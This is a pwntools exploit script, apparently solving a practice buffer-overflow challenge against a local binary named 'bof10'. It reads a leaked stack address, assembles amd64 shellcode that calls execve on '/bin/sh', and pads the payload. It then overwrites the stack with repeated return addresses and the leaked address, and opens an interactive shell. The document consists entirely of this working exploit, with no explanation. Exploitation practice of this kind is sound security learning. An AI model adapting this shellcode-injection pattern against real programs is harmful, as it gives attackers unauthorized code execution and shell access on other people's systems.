#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'
e = context.binary = ELF("/tmp/bof10", checksec=False)
p = process()

p.sendlineafter(b"Your name: ", b'A'*8)
p.recvuntil(b"I have a gift for you: ")
leak = int(p.recvline().strip(), 16)
log.success(f"Stack leak: {hex(leak)}")

shell = asm(
        '''
        mov rax, 29400045130965551
        push rax

        mov rax, 0x3b
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        syscall
        ''', arch = "amd64")

payload = shell
payload = payload.ljust(32, b'\0')
payload += p64(0x0000000000401357)*0x3b + p64(leak-0x210)
p.sendafter(b"Say something: ", payload)

p.interactive()
